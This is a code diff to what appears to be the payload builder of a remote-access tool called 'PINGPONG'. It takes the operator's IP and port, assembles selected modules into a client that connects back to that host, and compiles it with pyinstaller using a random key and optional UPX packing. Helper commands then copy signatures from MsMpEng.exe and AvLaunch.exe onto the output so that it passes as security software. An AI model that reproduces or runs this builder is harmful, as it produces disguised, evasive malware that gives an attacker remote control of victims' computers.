@@ -12,6 +12,17 @@ path.append("..")
 import main, config_set
 config_list = ['Default_ip', 'Default_port', 'usage']
 #加载默认设置
+def get_mod_data(p, start_line, end_line):
+	count = 1
+	output = ''
+	p.seek(0, 0)
+	for line in p.readlines():
+		if count <= end_line and count >= start_line:
+			output += line
+		count += 1
+	return output
+		
+	
 def load_config(config_list, payload_d):
     local_var = globals()
     for con in config_list:
@@ -26,20 +37,44 @@ def generate_random_str(randomlength=16):
 		random_str +=base_str[randint(0, length)]
 	return random_str
 #打包
+def find_mod_location(lst, p):
+	global line_count
+	line_count = 0
+	start_list_location = []
+	for line in p.readlines():
+		for us in lst:
+			start_us = f'{us}_START_location'
+			end_us = f'{us}_END_location'
+			is_find_start, is_find_end = False, False
+			if is_find_start and is_find_end:
+				break
+			if start_us in line:
+				exec(f'{us}_start_location = line_count + 1', globals())
+				exec(F'start_list_location.append({us}_start_location)')
+				is_find_start = True
+			if end_us in line:
+				exec(f'{us}_end_location = line_count + 1', globals())
+				is_find_end = True
+		line_count += 1
+	return start_list_location
 def pack(payload, printf, upx_command, is_ask=True):
+	if upx_command != " " and upx_command != "":
+			upx_command = "--upx-dir " + upx_command
+	else:
+		main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
 	glo = globals()
 	main.print_normal("payload>[*]Loading settings......")
 	payload_d = main.get_value('payload')
 	load_config(config_list, payload_d)
 	for key in usage.keys():
-		value = usage[key]
-		if value == '1':
-			value = True
-		elif value == '0':
-			value = False
+		if usage[key]== '1':
+			usage[key] = True
+		elif usage[key] == '0':
+			usage[key] = False
 		else:
 			main.print_error(f"payload>[-]datas error, cannot read data:{key}")
-		glo[key] = value
+
+		glo[key] = usage[key]
 	main.print_normal('payload>[*]Loading Done')
 	if is_ask:
 		ip = input(f"payload>[*]Please input the ip of your host(blank for {Default_ip})>")
@@ -53,7 +88,7 @@ def pack(payload, printf, upx_command, is_ask=True):
 		try:
 			port = int(port)
 		except:
-			print_error("handler>[-]port input error")
+			main.print_error("handler>[-]port input error")
 	else:
 		ip = Default_ip
 		port = Default_port
@@ -68,41 +103,45 @@ def pack(payload, printf, upx_command, is_ask=True):
 	
 	""")
 	choice = input("payload>[*]Start?[y/n]>")
-	if choice == 'y' or choice == 'Y' or choice == 'YES' or choice == 'yes':
+	if choice == 'y' or choice == 'Y' or choice == 'YES' or choice == 'yes' or choice == ' ' or choice == '':
 		key = generate_random_str(randomlength=16)
 		main.print_normal(f"The key is: {key}")
 		current_path = abspath(__file__)
 		father_path = abspath(dirname(current_path) + sep + ".")
-		if upx_command != " " and upx_command != "":
-			upx_command = "--upx-dir " + upx_command
-		else:
-			main.print_warn("payload>[!]TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
 		print(f"{install_path}/Lib/site-packages")
 		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w"
 		command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
 		command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"
 		if printf:
 			main.print_normal("payload>[*]Loading payload......")
-			with open("./payload/" + payload + "_file.py", "r", encoding="utf8") as p:
-				pay = p.read()
-			with open("./payload/payload.py", "w+", encoding="utf8") as a:
-					a.write(pay)
-					a.write(f"""
-if __name__ == '__main__':
-	PINGPONG_client("{ip}", {port})""")
-		else:
-			with open("./payload/_basic_conn.py", "r", encoding="utf8") as p:
-				pay = p.read()
-			with open("./payload/payload.py", "w+", encoding="utf8") as a:
-					a.write(pay)
-					a.write(f"""
-if __name__ == '__main__':
-	_connent("{ip}", {port})""")
+		with open("./payload/" + payload + "_file.py", "r", encoding="utf8") as p:
+			open_usage = []
+			for i in usage.keys():
+				if usage[i]:
+					open_usage.append(i)
+			line_number = len(p.readlines())
+			global init, start_list, init_location, exit_init
+			p.seek(0, 0)
+			start_list = find_mod_location(open_usage, p)
+			start_list.sort()
+			mod_max_line = start_list[-1]
+			exit_init = get_mod_data(p, mod_max_line, line_number)
+			init_location = min(start_list)
+			init = get_mod_data(p, 1, init_location)
+			for _usage in open_usage:
+				exec(f"{_usage}_mod = get_mod_data(p, {_usage}_start_location, {_usage}_end_location)")
+		with open("./payload/payload.py", "w+", encoding="utf8") as a:
+			a.write(init)
+			for _usage in open_usage:
+				exec(f"a.write({_usage}_mod)")
+			a.write(exit_init)
+			a.write(f"""
+PINGPONG_client("{ip}", {port})""")
 		try:
 			system(command)
 			if printf:
 				main.print_normal("payload>[*]deleting temp files......")
-			remove("./payload/payload.py")
+			# remove("./payload/payload.py")
 			if isfile("payload.exe"):
 				remove("payload.exe")
 			if isdir("./payload/upload_payload"):
